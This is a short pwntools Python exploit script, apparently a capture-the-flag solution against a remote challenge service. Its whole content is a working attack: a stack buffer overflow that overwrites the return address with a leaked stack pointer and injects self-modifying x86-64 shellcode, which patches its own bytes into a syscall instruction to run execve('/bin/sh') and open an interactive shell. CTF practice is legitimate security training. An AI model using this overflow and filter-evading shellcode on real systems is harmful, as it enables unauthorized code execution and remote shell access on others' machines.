#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])

        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("tjc.tf", 31365)

    return r


def main():
    r = conn()

    padding = b'A' * 264

    ret_address = bytes.fromhex(r.recvlineS()[2:-1])[::-1]      # format: 0x...\n
    ret_address = int.from_bytes(ret_address, 'little') + 272

    log.info(f'Shellcode running @ {hex(ret_address)}')

    shellcode = asm(f'''
        push 0x00;
        mov rdi, 0x{b'hs/nib/'.hex()}
        push rdi;

        lea rdi, qword ptr [rsp];
        mov rsi, 0;
        mov rdx, 0;
        mov rax, 0x3b;
    ''') + b'\x0e\x04'

    # Add polymorph code (+8 for the "add byte ptr" instruction)
    shellcode = asm(f'''
        add byte ptr [rsp + {len(shellcode) + 8}], 1;
        add byte ptr [rsp + {len(shellcode) + 9}], 1;
    ''') + shellcode

    payload = padding + p64(ret_address) + shellcode

    r.sendline(payload)
    r.interactive('$ ')


if __name__ == "__main__":
    main()
